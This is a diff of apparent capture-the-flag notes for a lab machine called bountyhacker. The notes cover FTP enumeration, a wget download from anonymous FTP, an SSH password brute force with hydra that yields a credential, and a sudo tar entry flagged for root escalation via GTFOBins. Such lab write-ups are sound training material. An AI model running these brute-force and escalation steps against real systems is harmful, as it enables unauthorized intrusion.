@@ -8,7 +8,7 @@
 
 ## Enumeration
 
-- Nmap Initial
+### Nmap
 
 1. 21/ftp vsftpd 3.0.3
    - anonymous FTP login allowed
@@ -17,9 +17,8 @@
    - server - Apache/2.4.18 (Ubuntu)
 
 - check ftp anonymous login
-  - nothing found
-  - 229 Entering Extended Passive Mode (|||9411|) (I don't know why I get that error)
-- get files from ftp server (find a command to download from ftp server from hacktricks)
+  - two files found
+  - get files from ftp server (find a command to download from ftp server from hacktricks)
 
 ```sh
 wget -m --no-passive ftp://anonymous:anonymous@$IP
@@ -28,14 +27,24 @@ wget -m --no-passive ftp://anonymous:anonymous@$IP
 - get two files
   - locks.txt
   - task.txt
-- name -> lin
-- locks.txt file may be password files
+
+```
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
+```
+- contents of locks.txt file may be passwords
 - brute force ssh with user `lin` with password from locks.txt
 
 ```sh
 hydra -l lin -P from_ftp/locks.txt ssh://$IP
 # login: lin   password: RedDr4gonSynd1cat3
 ```
+
+## User Access
+
+- Enter ssh with lin user
 
 - `sudo -l` for lin
 
@@ -47,6 +56,8 @@ Matching Defaults entries for lin on bountyhacker:
 User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 ```
+
+## Root Access
 
 - from gtfobins, sudo for tar
 
